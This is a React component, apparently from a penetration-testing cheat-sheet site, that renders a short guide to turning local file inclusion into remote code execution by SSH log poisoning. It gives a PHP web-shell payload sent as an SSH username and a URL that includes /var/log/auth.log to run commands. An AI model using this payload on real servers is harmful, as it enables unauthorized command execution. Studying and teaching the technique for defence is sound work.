import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const LFI_2_RCE_SSH_Log = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Typography>
              The file /var/log/auth.log records authentication-related SSH events and information, such as user logins, logouts, and authentication failures. As /var/log/auth.log contains sensitive authentication-related information, it is typically only accessible by privileged users (e.g., root or users in the adm group). 
              </Typography>
            <Box pt={5}></Box>
            <Typography>
            Try to ssh into the box with a PHP code as username &lt;?php system($_GET["cmd"]);?&gt;.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'ssh <?php system($_GET["cmd"]);?>@10.10.10.10'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography>
            Then include the SSH log files inside the Web Application.
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'http://example.com/index.php?page=/var/log/auth.log&cmd=id'}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
              <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#rce-via-ssh" target="_blank">
                  <TreeItem nodeId="2" label="PayloadAllTheThings" />
                </a>
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default LFI_2_RCE_SSH_Log;
  